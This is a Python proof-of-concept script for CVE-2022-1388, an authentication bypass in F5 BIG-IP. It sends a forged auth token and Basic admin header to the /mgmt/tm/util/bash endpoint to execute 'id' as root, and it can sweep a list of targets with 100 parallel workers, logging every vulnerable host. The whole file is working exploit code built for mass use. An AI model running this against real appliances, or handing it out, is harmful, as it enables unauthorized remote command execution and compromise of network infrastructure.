import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗        ██╗██████╗  █████╗  █████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ███║╚════██╗██╔══██╗██╔══██╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗╚██║ █████╔╝╚█████╔╝╚█████╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ██╔═══╝ ╚════╝ ██║ ╚═══██╗██╔══██╗██╔══██╗
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗███████╗       ██║██████╔╝╚█████╔╝╚█████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚══════╝       ╚═╝╚═════╝  ╚════╝  ╚════╝ 
                                                                                                
                                                version:BIG-IP versions 16.1.0 to 16.1.2 (Patch released)
                                                        BIG-IP versions 15.1.0 to 15.1.5 (Patch released)
                                                        BIG-IP versions 14.1.0 to 14.1.4 (Patch released)
                                                        BIG-IP versions 13.1.0 to 13.1.4 (Patch released)
                                                        BIG-IP versions 12.1.0 to 12.1.6 (End of Support)
                                                        BIG-IP versions 11.6.1 to 11.6.5 (End of Support)                  
                                                                                
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="F5 BIG-IP 存在远程命令执行漏洞(CVE-2022-1388)")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
        
def poc(target):
    payload = "/mgmt/tm/util/bash"
    url = target+payload
    header = {
       "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "X-F5-Auth-Token": "vvs",
        "Authorization": "Basic YWRtaW46",
        "Content-Length": "46",
        "Content-Type": "application/x-www-form-urlencoded",

            }    
    data = '''
    {"command": "run" , "utilCmdArgs": "-c id" }
    '''
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if  res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            if 'root' in res1.text and res1.status_code == 200:
                print(f"[+]此url{target}存在漏洞")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n') 
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()